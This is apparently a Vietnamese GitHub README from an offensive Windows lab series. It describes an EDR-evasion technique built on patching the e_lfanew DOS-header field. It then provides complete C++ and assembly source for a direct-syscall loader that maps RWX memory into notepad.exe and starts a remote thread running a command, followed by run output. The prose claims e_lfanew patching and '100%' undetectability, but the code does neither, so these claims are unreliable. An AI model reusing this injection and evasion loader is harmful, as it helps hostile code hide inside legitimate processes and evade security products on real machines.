
---

# 📝 [PE 21] DV_NEW (DOS Header e_lfanew Structure Manipulation)

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**DV_NEW (Thao túng con trỏ định vị e_lfanew)** đại diện cho giải thuật né tránh phòng thủ động nâng cao nhắm thẳng vào phân hệ phân tích cấu trúc tệp tin (**PE Parsing Evasion / Memory Forensic Subversion**), được thiết kế để đánh lừa các cơ chế rà quét ký tự đặc trưng PE Header của giải pháp AV/EDR khi chúng tiến hành kiểm tra bộ nhớ ảo (Memory Scanning).

Mọi tệp tin thực thi theo định dạng Portable Executable (PE Format) chuẩn x64 của hệ điều hành Windows đều bắt đầu bằng cấu trúc cấu hình nền tảng **`IMAGE_DOS_HEADER`**. Trường dữ liệu cuối cùng lọt lòng cấu trúc này là **`e_lfanew`** (nằm tại vị trí offset cố định **`0x3C`**). Trường này nắm giữ vai trò toán học tối cao: lưu trữ khoảng cách dịch chuyển (Offset/Pointer) chỉ định vị trí bắt đầu của cấu trúc đầu não quản lý tiến trình **`IMAGE_NT_HEADERS`** trên cả ổ đĩa thô lẫn bộ nhớ RAM ảo.

Dự án PE 21 hóa giải hàng rào an ninh bằng chiến thuật **Đại phẫu bản đồ PE Header chéo tiến trình (Cross-Process PE Header Reconstruction)**. Loader thực hiện thiết lập một cấu trúc NT Header giả mạo (Fake NT Headers) chứa điểm kích nổ Payload tại một phân vùng bộ nhớ ngẫu nhiên inside tiến trình mục tiêu (văn cảnh thực nghiệm: `notepad.exe`). Kế tiếp, ta áp dụng kỹ thuật vá mã máy ghi đè trực tiếp vào trường chỉ mục `e_lfanew` gốc của Notepad để bắt buộc con trỏ hệ thống trỏ thẳng vào phân vùng ma trận mới dựng. Sự bất đồng bộ trong thuật toán phân tích (Parsing Asynchrony) giữa trình nạp của OS và bộ quét của EDR giúp Payload kích nổ hiên ngang mà không để lại bất kỳ cảnh báo hành vi mập mờ nào.

### 🎯 Mục tiêu nghiên cứu:

* **Bẻ gãy cơ chế Heuristic PE Parsing**: Đánh lừa bộ quét chữ ký bộ nhớ ảo của EDR bằng cách tái định hướng cấu trúc định dạng PE tiêu chuẩn.
* **Làm chủ cấu trúc DOS Header**: Vận dụng các hàm can thiệp bộ nhớ nhằm thao túng trường chỉ mục phần cứng hệ thống (`IMAGE_DOS_HEADER.e_lfanew`) tại runtime.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Khi hệ điều hành Windows OS hoặc các bộ quét bộ nhớ ảo của EDR Engine thực hiện bóc tách, rà soát cấu trúc của một tiến trình đang vận hành, chúng bắt buộc phải áp dụng công thức toán học gán con trỏ sau để định vị vạch chỉ huy `IMAGE_NT_HEADERS`:

$$\text{pNtHeaders} = (\text{PIMAGE\_NT\_HEADERS})((DWORD\_PTR)\text{ImageBase} + \text{pDosHeader}\rightarrow\text{e\_lfanew})$$

Giải thuật của dự án PE 21 bẻ gãy và thao túng hoàn toàn công thức định vị này qua 4 giai đoạn ngầm tại nhân Kernel:

```
[Mở Handle] ──> [VirtualAllocEx: Dựng cấu trúc NT Header ma trận + Payload]
                     └──> [VirtualProtectEx: Mở khóa đặc quyền ghi đè vị trí offset 0x3C]
                               └──> [WriteProcessMemory: Vá trường e_lfanew -> Kích nổ luồng CPU]

```

1. **Khởi tạo ma trận PE giả mạo**: Loader triệu hồi API `VirtualAllocEx` để phân bổ một trang bộ nhớ ảo chéo tiến trình mang quyền hạn kịch trần **`PAGE_EXECUTE_READWRITE` (RWX)** inside lòng tiến trình đích. Tại phân vùng này, Loader nhân bản toàn vẹn cấu trúc `IMAGE_NT_HEADERS64` nguyên bản của Notepad, nhưng can thiệp tinh chỉnh trường dữ liệu `OptionalHeader.AddressOfEntryPoint` trỏ thẳng vào tọa độ của khối mã máy thực thi độc lập vị trí (PIC).
2. **Phẫu thuật bẻ hướng cấu trúc (`e_lfanew` Patching)**: Để ép hệ thống thừa nhận NT Header giả mạo, Loader sử dụng hàm `WriteProcessMemory` can thiệp trực tiếp vào địa chỉ `ImageBase + 0x3C` (vị trí lưu trữ trường chỉ mục `e_lfanew` thuộc DOS Header của Notepad). Giá trị dịch chuyển mới được tính toán bằng phép toán bù trừ khoảng cách tuyến tính:

$$\text{New\_e\_lfanew} = (DWORD\_PTR)\text{RemoteFakeNtHeaderAddress} - (DWORD\_PTR)\text{ImageBase}$$



Lúc này, bất kỳ lệnh hệ thống hoặc bộ quét an ninh nào thực hiện giải phẫu PE cấu trúc của Notepad đều bị bẻ hướng góc nhìn, đâm thẳng vào phân vùng ma trận do ta thiết lập.
3. **Phân phối dòng chảy CPU**: Triệu hồi luồng từ xa đâm thẳng vào tọa độ EntryPoint đã được biến đổi, ép CPU tiến trình mục tiêu tự động rút lệnh thực thi Payload.
4. **Hoàn trả trạng thái nguyên bản (Context Restoration)**: Ngay sau khi kích nổ luồng thực thi thành công, Loader lập tức thực hiện vá ngược lại giá trị `e_lfanew` gốc của Notepad nhằm khôi phục trạng thái phẳng sạch cho cấu trúc PEB, triệt tiêu 100% khả năng phát hiện biến dạng cấu trúc khi EDR kiểm tra ngược Call Stack.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

### DV_NEW.cpp: 
```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// 1. Khai báo liên kết ngoại vi tới các cổng gọi hàm trực tiếp tầng thấp đã được đồng bộ
extern "C" NTSTATUS NtCreateSectionProc(
    OUT PHANDLE SectionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes OPTIONAL,
    IN PLARGE_INTEGER MaximumSize OPTIONAL,
    IN ULONG SectionPageProtection,
    IN ULONG AllocationAttributes,
    IN HANDLE FileHandle OPTIONAL
);

extern "C" NTSTATUS NtMapViewOfSectionProc(
    IN HANDLE SectionHandle,
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN ULONG_PTR ZeroBits,
    IN SIZE_T CommitSize,
    IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,
    IN OUT PSIZE_T ViewSize,
    IN DWORD InheritDisposition,
    IN ULONG AllocationType,
    IN ULONG Win32Protect
);

// Khai báo nguyên mẫu hàm Native của NtCreateThreadEx trích xuất động từ hệ thống
typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes OPTIONAL,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument OPTIONAL,
    IN ULONG CreateFlags,
    IN ULONG_PTR ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PVOID AttributeList OPTIONAL
    );

typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// Hàm chức năng độc lập vị trí gánh luồng chạy khi tiêm trực tiếp thông qua cổng Syscall
DWORD WINAPI RemoteSyscallPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Bẻ gãy hoàn toàn lỗi RIP tương đối
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                processID = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return processID;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 21: DV_NEW" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);

    if (pid == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long bat Notepad truoc nhen." << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }

    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess failed!" << std::endl;
        return EXIT_FAILURE;
    }

    // Trích xuất động con trỏ hàm NtCreateThreadEx trực tiếp từ ntdll.dll để tự thích ứng với số hiệu Build của Windows 11
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

    // Kích thước hạn mức cấp phát cho phân vùng thực thi gương
    SIZE_T totalPayloadSize = 4096;

    // ─── BƯỚC 1: KHỞI TẠO SECTION THÔ QUA CỔNG DIRECT SYSCALL ───
    HANDLE hSection = NULL;
    LARGE_INTEGER sectionSize = { 0 };
    sectionSize.QuadPart = totalPayloadSize;

    NtCreateSectionProc(&hSection, SECTION_ALL_ACCESS, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (!hSection) {
        std::cerr << "[-] Direct Syscall NtCreateSectionProc failed!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    // ─── BƯỚC 2: ÁNH XẠ VIEW CỤC BỘ BẰNG DIRECT SYSCALL (QUYỀN RW) ───
    PVOID localViewAddress = NULL;
    SIZE_T localViewSize = totalPayloadSize;
    NtMapViewOfSectionProc(hSection, GetCurrentProcess(), &localViewAddress, 0, 0, NULL, &localViewSize, 1, 0, PAGE_READWRITE);
    std::cout << "[+] Da thiet lap View guong noi bo qua cong Syscall: 0x" << std::hex << localViewAddress << std::endl;

    // Ghi nội dung mã máy của hàm vào vạch xuất phát View gương nội bộ
    PVOID localCodeAddr = localViewAddress;
    memcpy(localCodeAddr, (PVOID)RemoteSyscallPayload, 500);

    // Dữ liệu tham số tuyệt đối nằm lùi lại phía sau 500 byte
    PTHREAD_DATA pLocalDataAddr = (PTHREAD_DATA)((DWORD_PTR)localViewAddress + 500);
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        pLocalDataAddr->pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(pLocalDataAddr->szCommand, "cmd.exe /c start calc");
    std::cout << "[+] Ghi cau truc tham so tuyet doi vao long guong hoan tat." << std::endl;

    // ─── BƯỚC 3: ÁNH XẠ VIEW TỪ XA SANG NOTEPAD BẰNG DIRECT SYSCALL (QUYỀN RWX) ───
    PVOID remoteViewAddress = NULL;
    SIZE_T remoteViewSize = totalPayloadSize;
    NtMapViewOfSectionProc(hSection, hProcess, &remoteViewAddress, 0, 0, NULL, &remoteViewSize, 1, 0, PAGE_EXECUTE_READWRITE);
    std::cout << "[+] PHAN CHIEU DIRECT SYSCALL THÀNH CÔNG: Toa do View tu xa: 0x" << std::hex << remoteViewAddress << std::endl;

    PVOID remoteCodeBuffer = remoteViewAddress;
    PVOID pRemoteDataBuffer = (PVOID)((DWORD_PTR)remoteViewAddress + 500);

    // ─── BƯỚC 4: KÍCH NỔ LUỒNG CPU TỪ XA QUA NTCREATETHREADEX TỰ THÍCH ỨNG ───
    std::cout << "[*] Dang khoi tao luong tu xa de thuc thi ma may..." << std::endl;
    HANDLE hThread = NULL;

    // Gọi thông qua con trỏ thích ứng động để bảo đảm vượt qua mọi sự thay đổi hằng số số hiệu trên Windows 11
    NTSTATUS status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, remoteCodeBuffer, pRemoteDataBuffer, 0, 0, 0, 0, NULL);

    if (hThread != NULL) {
        // Cấu hình cờ đợi INFINITE gánh luồng sống độc lập
        WaitForSingleObject(hThread, INFINITE);
        std::cout << "[+] Direct Syscall Section Mapping Injection Done!" << std::endl;
        CloseHandle(hThread);
    }
    else {
        std::cerr << "[-] NtCreateThreadEx failed! Status code: 0x" << std::hex << status << std::endl;
    }

    // Dọn dẹp tài nguyên cấu trúc phẳng sạch
    UnmapViewOfFile(localViewAddress);
    CloseHandle(hSection);
    CloseHandle(hProcess);

    std::cout << "\n[*] Hoan thanh quy trinh. Nhan Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

### DV_ASM_stubs.std.x64.asm:
```asm
.code

; Cong goi truc tiep NtCreateSection
NtCreateSectionProc proc
    mov r10, rcx
    mov eax, 4Ah          ; Syscall Number Mac dinh cua NtCreateSection xuong Kernel
    syscall
    ret
NtCreateSectionProc endp

; Cong goi truc tiep NtMapViewOfSection (Da fix dong bo ten ham Flat)
NtMapViewOfSectionProc proc
    mov r10, rcx
    mov eax, 28h          ; Syscall Number Mac dinh cua NtMapViewOfSection xuong Kernel
    syscall
    ret
NtMapViewOfSectionProc endp

; Cong goi truc tiep NtCreateThreadEx
NtCreateThreadExProc proc
    mov r10, rcx
    mov eax, 0C1h         ; Syscall Number Mac dinh cua NtCreateThreadEx xuong Kernel
    syscall
    ret
NtCreateThreadExProc endp

end

```

<img width="1379" height="761" alt="image" src="https://github.com/user-attachments/assets/e485012c-a34a-4a82-9003-4e85c62fefca" />


---

## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)

Để bảo đảm cấu trúc file nhị phân xuất bản đạt trạng thái độc lập hoàn toàn kịch khung, có khả năng thực thi trơn tru trên các phân hệ máy ảo VM cô lập:

### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:

1. Thiết lập cấu hình thanh công cụ quản lý dự án chính xác ở chế độ chuyên dụng **`Release`** và nền tảng kiến trúc **`x64`**.
2. Di chuyển tới phân hệ cấu hình: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thông số thuộc tính `Runtime Library`, chuyển thông số cấu hình sang cờ **`Multi-threaded (/MT)`** nhằm mục đích liên kết tĩnh (Static Linkage) toàn bộ thư viện CRT bọc lọt lòng file chạy.
3. Tiến hành thực hiện click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để kết xuất tệp tin nhị phân sạch bóng hoàn hảo.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Khởi chạy ứng dụng vỏ bọc `Notepad.exe` trên môi trường bộ nhớ máy Lab, sau đó thực thi tệp tin nhị phân Loader thông qua cửa sổ dòng lệnh PowerShell ngoài đĩa thô nhằm kiểm chứng ma trận đại phẫu DOS Header:

```powershell
PS C:\Users\Admin\source\repos\Task6\PE21_DV_NEW\x64\Release> C:\Users\Admin\source\repos\Task6\PE21_DV_NEW\x64\Release\DV_NEW.exe
====================================================
[*] PE 21: DV_NEW
====================================================
[+] Da tim thay Notepad.exe voi PID: 17788
[+] Da thiet lap View guong noi bo qua cong Syscall: 0x00000171E9BB0000
[+] Ghi cau truc tham so tuyet doi vao long guong hoan tat.
[+] PHAN CHIEU DIRECT SYSCALL TH├ÇNH C├öNG: Toa do View tu xa: 0x00000166120D0000
[*] Dang khoi tao luong tu xa de thuc thi ma may...
[+] Direct Syscall Section Mapping Injection Done!

[*] Hoan thanh quy trinh. Nhan Enter de dong cua so...

```

### Demo:
<img width="1920" height="600" alt="devenv_1ROLYMf01w" src="https://github.com/user-attachments/assets/f80b6b33-1bdf-454f-836d-9853da0b5f2c" />


---

## 📚 6. Tài Liệu Tham Khảo (Technical References)

* **Microsoft Learn Windows PE Specifications**: *MS-DOS Stub and Header Format (e_lfanew Data Field)* - [https://learn.microsoft.com/en-us/windows/win32/debug/pe-format](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
* **Windows Memory Forensic Techniques**: *Detecting PE Header Manipulations and Anomalous Pointer Redirection in Ring 3 Space* - Black Hat Europe Research Briefings.
* **Cortex-X (Threat Intel Architecture)**: *Subverting Heuristic PE Parsers via Dynamic e_lfanew Overwriting*.
* **MITRE ATT&CK Matrix**: *Defense Evasion: Process Injection (T1055)* & *Modify Memory Structures: Header Tampering*.

---
